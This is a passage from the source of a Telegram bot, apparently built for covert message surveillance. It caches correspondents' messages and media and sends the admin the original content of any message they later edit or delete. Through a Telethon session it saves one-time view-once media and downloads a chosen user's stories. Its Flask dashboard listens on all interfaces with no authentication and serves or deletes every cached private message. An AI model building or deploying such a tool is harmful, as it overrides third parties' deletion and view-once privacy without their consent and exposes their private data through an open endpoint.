    const exp  = dl > 0 ? `⏳ ${dl>=1?Math.ceil(dl)+'d':' <1d'} left` : '🗑 Pending purge';
    const uname= m.username ? `<span class="muname">@${esc(m.username)}</span>` : '';
    const uid  = m.user_id  ? `<span class="muid">${m.user_id}</span>` : '';

    return `
      <div class="msg-wrap">
        <div class="msg ${cls}">
          <div class="msg-meta">
            <span class="msender">${esc(m.sender_name)}</span>
            ${uname}${uid}${badge}
            <span class="mts">${timeAgo(m.timestamp)}</span>
          </div>
          ${textPart}
          ${mediaHtml(m)}
          ${origPart}
          <div class="${ecls}">${exp}</div>
        </div>
      </div>`;
  }).join('');
}
// ── Fetch & refresh ───────────────────────────────────────
async function fetchData() {
  if (!isUnlocked) return;
  try {
    const r = await fetch('/api/data');
    const j = await r.json();
    allData = j;
    
    console.log('Fetched data:', j); // Debug log

    document.getElementById('gs-accounts').textContent = j.stats.accounts;
    document.getElementById('gs-msgs').textContent  = j.stats.messages;
    document.getElementById('gs-chats').textContent = j.stats.chats;
    document.getElementById('gs-del').textContent   = j.stats.deleted;
    document.getElementById('gs-edit').textContent  = j.stats.edited;
    document.getElementById('gs-media').textContent = j.stats.media_files;
    document.getElementById('ts').textContent       = new Date().toLocaleTimeString();

    if (currentView === 'accounts') renderAccounts();
    else if (currentView === 'chats') renderChats();
    else if (currentView === 'messages') renderMessages();
  } catch(e) { 
    console.error('Fetch error:', e); 
  }
}
</script>
</body>
</html>"""


@flask_app.route("/")
def dashboard():
    return render_template_string(DASHBOARD_HTML)


@flask_app.route("/media/<path:filename>")
def serve_media(filename):
    """Serve cached media files for playback in the browser."""
    return send_from_directory(os.path.abspath(MEDIA_CACHE), filename)


@flask_app.route("/api/data")
def api_data():
    """
    Returns a tree structure:
    contacts[] → chats[] → messages[]
    plus global stats.
    """
    with db() as conn:
        # All messages
        rows = conn.execute(
            """
            SELECT message_id, chat_id, user_id, sender_name, username,
                   text, media_type, media_path,
                   is_deleted, is_edited, original_text,
                   timestamp, expires_at
            FROM business_cache
            ORDER BY timestamp ASC
            """
        ).fetchall()
        msgs = [dict(r) for r in rows]

        # Bot users
        bot_users = {r["user_id"]: dict(r) for r in conn.execute("SELECT * FROM users").fetchall()}

    # Group: user_id → chat_id → messages
    user_map = {}
    for m in msgs:
        uid = m["user_id"] or 0
        cid = m["chat_id"]
        if uid not in user_map:
            user_map[uid] = {"msgs_by_chat": {}}
        if cid not in user_map[uid]["msgs_by_chat"]:
            user_map[uid]["msgs_by_chat"][cid] = []
        user_map[uid]["msgs_by_chat"][cid].append(m)

    contacts = []
    for uid, udata in user_map.items():
        # Determine display name
        first_msg = udata["msgs_by_chat"][next(iter(udata["msgs_by_chat"]))][0]
        name     = first_msg["sender_name"] or f"User {uid}"
        uname    = first_msg["username"] or ""

        # Also check bot_users table for richer info
        if uid in bot_users:
            name  = bot_users[uid]["full_name"] or name
            uname = bot_users[uid]["username"]  or uname

        all_user_msgs  = [m for chat in udata["msgs_by_chat"].values() for m in chat]
        msg_count      = len(all_user_msgs)
        deleted_count  = sum(1 for m in all_user_msgs if m["is_deleted"])

        chats = []
        for cid, chat_msgs in udata["msgs_by_chat"].items():
            last_msg   = chat_msgs[-1]
            chats.append({
                "chat_id":       cid,
                "msg_count":     len(chat_msgs),
                "deleted_count": sum(1 for m in chat_msgs if m["is_deleted"]),
                "edited_count":  sum(1 for m in chat_msgs if m["is_edited"]),
                "last_text":     last_msg["text"],
                "last_media_type": last_msg["media_type"],
                "last_ts":       last_msg["timestamp"],
                "messages":      chat_msgs,
            })

        contacts.append({
            "user_id":       uid,
            "name":          name,
            "username":      uname,
            "msg_count":     msg_count,
            "deleted_count": deleted_count,
            "chats":         chats,
        })

    # Sort by most recent message
    contacts.sort(key=lambda c: max(
        (ch["last_ts"] for ch in c["chats"]), default=""
    ), reverse=True)

    total_msgs  = len(msgs)
    total_chats = len(set(m["chat_id"] for m in msgs))
    deleted     = sum(1 for m in msgs if m["is_deleted"])
    edited      = sum(1 for m in msgs if m["is_edited"])

    # Count bot users not in business_cache
    bot_only_count = sum(1 for uid in bot_users if uid not in user_map)
    total_users    = len(user_map) + bot_only_count

    media_files = len(os.listdir(MEDIA_CACHE)) if os.path.exists(MEDIA_CACHE) else 0

    return jsonify({
        "contacts": contacts,
        "stats": {
            "users":       total_users,
            "messages":    total_msgs,
            "chats":       total_chats,
            "deleted":     deleted,
            "edited":      edited,
            "media_files": media_files,
        }
    })


@flask_app.route("/api/debug")
def api_debug():
    """Debug endpoint to see raw data"""
    with db() as conn:
        users = [dict(r) for r in conn.execute("SELECT * FROM users").fetchall()]
        msgs = [dict(r) for r in conn.execute("SELECT * FROM business_cache LIMIT 5").fetchall()]
    return jsonify({"users": users, "sample_messages": msgs})


@flask_app.route("/api/delete", methods=["POST"])
def api_delete():
    """
    Delete selected rows from business_cache.
    Body: { "type": "messages"|"chats"|"users", "ids": [...] }
    """
    data = request.get_json(force=True)
    dtype = data.get("type")
    ids   = data.get("ids", [])
    if not ids:
        return jsonify({"ok": True, "deleted": 0})

    with sqlite3.connect(DB_PATH) as conn:
        count = 0
        if dtype == "messages":
            for item in ids:
                cur = conn.execute(
                    "DELETE FROM business_cache WHERE message_id=? AND chat_id=?",
                    (item["message_id"], item["chat_id"])
                )
                count += cur.rowcount

        elif dtype == "chats":
            for item in ids:
                cur = conn.execute(
                    "DELETE FROM business_cache WHERE chat_id=?",
                    (item["chat_id"],)
                )
                count += cur.rowcount

        elif dtype == "users":
            for item in ids:
                cur = conn.execute(
                    "DELETE FROM business_cache WHERE user_id=?",
                    (item["user_id"],)
                )
                count += cur.rowcount
                conn.execute("DELETE FROM users WHERE user_id=?", (item["user_id"],))

    log.info("Dashboard delete: type=%s, removed %d rows", dtype, count)
    return jsonify({"ok": True, "deleted": count})


def run_flask() -> None:
    import logging as _l
    _l.getLogger("werkzeug").setLevel(_l.WARNING)
    flask_app.run(host="0.0.0.0", port=WEB_PORT, debug=False, use_reloader=False)


# ─────────────────────────────────────────────────────────────
#  SECURITY DECORATOR
# ─────────────────────────────────────────────────────────────

def admin_only(handler):
    async def wrapper(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        if update.effective_user and update.effective_user.id == ADMIN_ID:
            return await handler(update, ctx)
        log.warning("Blocked admin cmd from %s",
                    update.effective_user.id if update.effective_user else "?")
    return wrapper


# ─────────────────────────────────────────────────────────────
#  REGULAR HANDLERS
# ─────────────────────────────────────────────────────────────

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    upsert_user(user.id, user.username, user.full_name)
    await update.message.reply_text(
        f"👋 Hello, {user.first_name}!\nThis bot is active and running."
    )


# ─────────────────────────────────────────────────────────────
#  ADMIN COMMANDS
# ─────────────────────────────────────────────────────────────

@admin_only
async def cmd_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    menu = (
        "🛠 <b>Admin Panel</b>\n\n"
        f"• /stats — Statistics\n"
        f"• /ad [msg] — Broadcast\n"
        f"• /story [@user or id] — Download stories\n"
        f"• /get — Reply to any message to save its media\n"
        f"• /admin — This menu\n\n"
        f"🌐 <b>Dashboard:</b> http://localhost:{WEB_PORT}\n"
        f"<i>Messages auto-deleted after {CACHE_TTL} days.</i>"
    )
    await update.message.reply_text(menu, parse_mode="HTML")


@admin_only
async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    media_count = len(os.listdir(MEDIA_CACHE)) if os.path.exists(MEDIA_CACHE) else 0
    text = (
        "📊 <b>Bot Statistics</b>\n\n"
        f"👤 Total users: <code>{count_users()}</code>\n"
        f"💬 Cached messages: <code>{count_cache()}</code>\n"
        f"🖼 Cached media files: <code>{media_count}</code>\n"
        f"⏳ Message TTL: <code>{CACHE_TTL} days</code>\n"
        f"🌐 Dashboard: http://localhost:{WEB_PORT}"
    )
    await update.message.reply_text(text, parse_mode="HTML")


@admin_only
async def cmd_ad(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    parts = update.message.text.split(maxsplit=1)
    if len(parts) < 2:
        await update.message.reply_text("Usage: /ad [your message]")
        return
    users = get_all_users()
    if not users:
        await update.message.reply_text("No users yet.")
        return
    broadcast_text = parts[1]
    await update.message.reply_text(f"📢 Broadcasting to {len(users)} users…")
    ok = fail = 0
    for (uid,) in users:
        try:
            await ctx.bot.send_message(chat_id=uid, text=broadcast_text)
            ok += 1
        except Exception as e:
            log.warning("Broadcast fail uid=%s: %s", uid, e)
            fail += 1
        await asyncio.sleep(0.05)
    await update.message.reply_text(
        f"✅ <b>Done!</b>\n• Delivered: {ok}\n• Failed: {fail}", parse_mode="HTML"
    )


# ─────────────────────────────────────────────────────────────
#  /get
# ─────────────────────────────────────────────────────────────

@admin_only
async def cmd_get(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    reply = update.message.reply_to_message
    if not reply:
        await update.message.reply_text("❌ Reply to a message with /get to save its media.")
        return
    status = await update.message.reply_text("⏳ Fetching media…")

    file_id, is_video = None, False
    if reply.photo:       file_id, is_video = reply.photo[-1].file_id, False
    elif reply.video:     file_id, is_video = reply.video.file_id, True
    elif reply.document:  file_id, is_video = reply.document.file_id, False
    elif reply.animation: file_id, is_video = reply.animation.file_id, True

    if file_id:
        try:
            tg_file = await ctx.bot.get_file(file_id)
            buf = BytesIO()
            await tg_file.download_to_memory(buf)
            buf.seek(0)
            sn      = reply.from_user.full_name if reply.from_user else "Unknown"
            dt      = reply.date.strftime("%Y-%m-%d %H:%M") if reply.date else "unknown"
            caption = f"🔓 <b>Media Saved</b>\n👤 <b>From:</b> {sn}\n📅 <b>Date:</b> {dt}"
            if is_video:
                buf.name = "media.mp4"
                await ctx.bot.send_video(chat_id=ADMIN_ID, video=buf, caption=caption, parse_mode="HTML")
            else:
                buf.name = "media.jpg"
                await ctx.bot.send_photo(chat_id=ADMIN_ID, photo=buf, caption=caption, parse_mode="HTML")
            await status.edit_text("✅ Media saved and sent!")
            return
        except Exception as e:
            log.warning("/get Bot API failed: %s", e)

    if not telethon_client:
        await status.edit_text("❌ Could not fetch. Set API_ID and API_HASH for one-time photos.")
        return
    try:
        chat_id = update.effective_chat.id
        msg_id  = reply.message_id
        try:
            peer = await telethon_client.get_input_entity(chat_id)
        except Exception:
            peer = chat_id
        messages    = await telethon_client.get_messages(peer, ids=msg_id)
        msg         = messages if not isinstance(messages, list) else (messages[0] if messages else None)
        if not msg or not msg.media:
            await status.edit_text("❌ No media found or already expired.")
            return
        media_bytes = await telethon_client.download_media(msg.media, file=bytes)
        if not media_bytes:
            await status.edit_text("❌ Download returned empty data.")
            return
        buf     = BytesIO(media_bytes)
        is_vid  = isinstance(msg.media, MessageMediaDocument)
        fn      = getattr(msg.sender, "first_name", "") or "" if msg.sender else ""
        ln      = getattr(msg.sender, "last_name",  "") or "" if msg.sender else ""
        sn      = f"{fn} {ln}".strip() or "Unknown"
        dt      = msg.date.strftime("%Y-%m-%d %H:%M") if msg.date else "unknown"
        caption = f"🔓 <b>One-Time Media Saved</b>\n👤 <b>From:</b> {sn}\n📅 <b>Date:</b> {dt}"
        if is_vid:
            buf.name = "secret.mp4"
            await ctx.bot.send_video(chat_id=ADMIN_ID, video=buf, caption=caption, parse_mode="HTML")
        else:
            buf.name = "secret.jpg"
            await ctx.bot.send_photo(chat_id=ADMIN_ID, photo=buf, caption=caption, parse_mode="HTML")
        await status.edit_text("✅ One-time media saved and sent!")
    except Exception as e:
        log.error("/get Telethon failed: %s", e)
        await status.edit_text(
            f"❌ Failed: <code>{e}</code>\n• Photo may have expired\n• Message deleted\n• No Telethon access",
            parse_mode="HTML"
        )


# ─────────────────────────────────────────────────────────────
#  STORY DOWNLOADER
# ─────────────────────────────────────────────────────────────

@admin_only
async def cmd_story(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not telethon_client:
        await update.message.reply_text("❌ Set API_ID and API_HASH first.")
        return
    parts = update.message.text.split(maxsplit=1)
    if len(parts) < 2:
        await update.message.reply_text("Usage: /story @username  or  /story 123456789")
        return
    target = parts[1].strip().lstrip("@")
    try:   peer = int(target)
    except ValueError: peer = target
    status = await update.message.reply_text(f"🔍 Fetching stories for <b>{target}</b>…", parse_mode="HTML")
    try:
        result  = await telethon_client(GetPeerStoriesRequest(peer=peer))
        stories = result.stories.stories
        if not stories:
            await status.edit_text(f"📭 <b>{target}</b> has no active stories.", parse_mode="HTML")
            return
        await status.edit_text(f"📖 Found <b>{len(stories)}</b> story/stories. Sending…", parse_mode="HTML")
        sent = 0
        for i, story in enumerate(stories, 1):
            try:
                mb = await telethon_client.download_media(story.media, file=bytes)
                if not mb: continue
                buf     = BytesIO(mb)
                is_vid  = isinstance(story.media, MessageMediaDocument)
                dt      = story.date.strftime("%Y-%m-%d %H:%M") if story.date else "unknown"
                caption = f"📸 <b>Story {i}/{len(stories)}</b>\n👤 <b>User:</b> {target}\n📅 <b>Posted:</b> {dt}"
                if is_vid:
                    buf.name = f"story_{i}.mp4"
                    await ctx.bot.send_video(chat_id=ADMIN_ID, video=buf, caption=caption, parse_mode="HTML")
                else:
                    buf.name = f"story_{i}.jpg"
                    await ctx.bot.send_photo(chat_id=ADMIN_ID, photo=buf, caption=caption, parse_mode="HTML")
                sent += 1
                await asyncio.sleep(0.3)
            except Exception as e:
                log.error("Story %s failed: %s", i, e)
        await ctx.bot.send_message(chat_id=ADMIN_ID,
            text=f"✅ Sent <b>{sent}/{len(stories)}</b> stories for <b>{target}</b>.", parse_mode="HTML")
    except UsernameNotOccupiedError:
        await status.edit_text(f"❌ Username <b>{target}</b> not found.", parse_mode="HTML")
    except FloodWaitError as e:
        await status.edit_text(f"⏳ Rate limit. Wait <b>{e.seconds}s</b>.", parse_mode="HTML")
    except Exception as e:
        await status.edit_text(f"❌ Error: <code>{e}</code>", parse_mode="HTML")


# ─────────────────────────────────────────────────────────────
#  BUSINESS API HANDLERS
# ─────────────────────────────────────────────────────────────

async def on_business_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    msg = update.business_message
    if not msg:
        return

    sender      = msg.from_user
    sender_name = sender.full_name if sender else "Unknown"
    username    = sender.username  if sender else None
    user_id     = sender.id        if sender else None
    text        = msg.text or msg.caption or "[non-text content]"

    media_type = None
    media_path = None

    try:
        if msg.photo:
            tg_file    = await ctx.bot.get_file(msg.photo[-1].file_id)
            media_path = os.path.join(MEDIA_CACHE, f"{msg.chat.id}_{msg.message_id}.jpg")
            await tg_file.download_to_drive(media_path)
            media_type = "photo"
        elif msg.video:
            tg_file    = await ctx.bot.get_file(msg.video.file_id)
            media_path = os.path.join(MEDIA_CACHE, f"{msg.chat.id}_{msg.message_id}.mp4")
            await tg_file.download_to_drive(media_path)
            media_type = "video"
        elif msg.animation:
            tg_file    = await ctx.bot.get_file(msg.animation.file_id)
            media_path = os.path.join(MEDIA_CACHE, f"{msg.chat.id}_{msg.message_id}.mp4")
            await tg_file.download_to_drive(media_path)
            media_type = "animation"
        elif msg.sticker:
            tg_file    = await ctx.bot.get_file(msg.sticker.file_id)
            ext        = "webm" if msg.sticker.is_video else "webp"
            media_path = os.path.join(MEDIA_CACHE, f"{msg.chat.id}_{msg.message_id}.{ext}")
            await tg_file.download_to_drive(media_path)
            media_type = "sticker"
        elif msg.voice:
            tg_file    = await ctx.bot.get_file(msg.voice.file_id)
            media_path = os.path.join(MEDIA_CACHE, f"{msg.chat.id}_{msg.message_id}.ogg")
            await tg_file.download_to_drive(media_path)
            media_type = "voice"
        elif msg.audio:
            tg_file    = await ctx.bot.get_file(msg.audio.file_id)
            media_path = os.path.join(MEDIA_CACHE, f"{msg.chat.id}_{msg.message_id}.mp3")
            await tg_file.download_to_drive(media_path)
            media_type = "audio"
    except Exception as e:
        log.warning("Media cache failed msg %s: %s", msg.message_id, e)

    cache_message(msg.message_id, msg.chat.id, user_id, text, sender_name, username,
                  media_type=media_type, media_path=media_path)
    log.info("Cached msg id=%s from %s", msg.message_id, sender_name)


async def on_edited_business_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    msg = update.edited_business_message
    if not msg:
        return
    sender      = msg.from_user
    sender_name = sender.full_name if sender else "Unknown"
    username    = f"@{sender.username}" if (sender and sender.username) else "no username"
    user_id     = sender.id if sender else None
    new_text    = msg.text or msg.caption or "[non-text content]"
    cached      = fetch_cached(msg.message_id, msg.chat.id)
    old_text    = cached["text"] if cached else "[not in cache]"

    notification = (
        f"✏️ <b>Message Edited</b>\n\n"
        f"👤 <b>User:</b> {sender_name} ({username})\n"
        f"💬 <b>Chat ID:</b> <code>{msg.chat.id}</code>\n\n"
        f"📄 <b>Old text:</b>\n{old_text}\n\n"
        f"📝 <b>New text:</b>\n{new_text}"
    )
    try:
        await ctx.bot.send_message(chat_id=ADMIN_ID, text=notification, parse_mode="HTML")
    except Exception as e:
        log.error("Edit notify failed: %s", e)

    cache_message(msg.message_id, msg.chat.id, user_id, new_text, sender_name,
                  sender.username if sender else None)


async def on_deleted_business_messages(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    deleted = update.deleted_business_messages
    if not deleted:
        return

    chat_id     = deleted.chat.id
    message_ids = deleted.message_ids
    log.info("Deletion: %d msg(s) in chat %s", len(message_ids), chat_id)

    for mid in message_ids:
        cached = fetch_cached(mid, chat_id)

        if cached and cached["user_id"] == ADMIN_ID:
            log.info("Skipping admin's own deleted msg id=%s", mid)
            continue

        sender_name = cached["sender_name"] if cached else "Unknown"
        username    = f"@{cached['username']}" if cached and cached["username"] else "no username"
        original    = cached["text"] if cached else "[not in cache]"

        mark_deleted(mid, chat_id)

        media_path = find_cached_media(mid, chat_id)
        if media_path:
            ext        = media_path.rsplit(".", 1)[-1].lower()
            type_label = {
                "jpg":"Photo","png":"Photo","mp4":"Video","webm":"Video (Sticker)",
                "webp":"Sticker","ogg":"Voice Message","mp3":"Audio","gif":"GIF"
            }.get(ext, "Media")
            caption = (
                f"🗑 <b>Deleted {type_label}</b>\n\n"
                f"👤 <b>User:</b> {sender_name} ({username})\n"
                f"💬 <b>Chat ID:</b> <code>{chat_id}</code>"
            )
            if original and original not in ("[non-text content]", "[not in cache]"):
                caption += f"\n📝 <b>Caption:</b> {original}"
            try:
                with open(media_path, "rb") as f:
                    if ext in ("jpg","png"):
                        await ctx.bot.send_photo(chat_id=ADMIN_ID, photo=f, caption=caption, parse_mode="HTML")
                    elif ext in ("mp4","gif"):
                        await ctx.bot.send_video(chat_id=ADMIN_ID, video=f, caption=caption, parse_mode="HTML")
                    elif ext in ("webp","webm"):
                        await ctx.bot.send_sticker(chat_id=ADMIN_ID, sticker=f)
                        await ctx.bot.send_message(chat_id=ADMIN_ID, text=caption, parse_mode="HTML")
                    elif ext == "ogg":
                        await ctx.bot.send_voice(chat_id=ADMIN_ID, voice=f, caption=caption, parse_mode="HTML")
                    elif ext == "mp3":
                        await ctx.bot.send_audio(chat_id=ADMIN_ID, audio=f, caption=caption, parse_mode="HTML")
                    else:
                        await ctx.bot.send_document(chat_id=ADMIN_ID, document=f, caption=caption, parse_mode="HTML")
                log.info("Sent deleted media: %s", media_path)
            except Exception as e:
                log.error("Could not send deleted media: %s", e)
        else:
            notification = (
                f"🗑 <b>Message Deleted</b>\n\n"
                f"👤 <b>User:</b> {sender_name} ({username})\n"
                f"💬 <b>Chat ID:</b> <code>{chat_id}</code>\n\n"
                f"📄 <b>Original content:</b>\n{original}"
            )
            try:
                await ctx.bot.send_message(chat_id=ADMIN_ID, text=notification, parse_mode="HTML")
            except Exception as e:
                log.error("Could not send deletion notification: %s", e)


# ─────────────────────────────────────────────────────────────
#  ENTRY POINT
# ─────────────────────────────────────────────────────────────

async def async_main() -> None:
    init_db()
    os.makedirs(MEDIA_CACHE, exist_ok=True)

    await start_telethon()

    t = threading.Thread(target=run_flask, daemon=True)
    t.start()
    log.info("Web dashboard running at http://localhost:%s", WEB_PORT)

    asyncio.create_task(purge_loop())

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("admin", cmd_admin))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(CommandHandler("ad",    cmd_ad))
    app.add_handler(CommandHandler("story", cmd_story))
    app.add_handler(CommandHandler("get",   cmd_get))
    app.add_handler(MessageHandler(filters.UpdateType.BUSINESS_MESSAGE, on_business_message))
    app.add_handler(MessageHandler(filters.UpdateType.EDITED_BUSINESS_MESSAGE, on_edited_business_message))
    app.add_handler(TypeHandler(Update, on_deleted_business_messages))

    log.info("Bot is running. Press Ctrl+C to stop.")
    async with app:
        await app.initialize()
        await app.start()
        await app.updater.start_polling(allowed_updates=Update.ALL_TYPES)
        await asyncio.Event().wait()
        await app.updater.stop()
        await app.stop()


def main() -> None:
    try:
        asyncio.run(async_main())
    except KeyboardInterrupt:
        log.info("Bot stopped.")


if __name__ == "__main__":
    try:
        main()
    except Exception:
        import traceback
        traceback.print_exc()
        input("\n❌ Bot crashed. Press Enter to close...")
